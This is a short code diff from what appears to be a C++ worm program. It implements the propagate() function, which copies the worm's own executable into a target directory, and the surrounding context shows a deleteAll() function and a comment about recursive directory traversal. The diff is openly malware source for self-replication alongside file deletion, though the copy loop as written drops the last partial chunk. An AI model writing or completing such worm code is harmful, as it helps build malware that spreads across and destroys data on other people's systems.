@@ -43,7 +43,22 @@ void deleteAll(std::string path) {
 // This function is responsible to copy the worm executable
 // file into the destination path
 void propagate(std::string destination) {
-    return;
+    // Opens original worm executable in readable binary mode
+    std::ifstream worm(file_path, std::ios::binary);
+    // Creates a new worm file in the destiation directory in
+    // writable binary mode
+    std::ofstream dst_worm(destination + "/worm", std::ios::binary);
+    // Declares a buffer to make the writing
+    char buffer[2048];
+
+    // while buffer is not completely read, write to a file
+    while (worm.read(buffer, sizeof(buffer))) {
+        dst_worm.write(buffer, worm.gcount());
+    }
+
+    // Close file streams
+    dst_worm.close();
+    worm.close();
 }
 
 // This function is responsible to recursively navigate through all
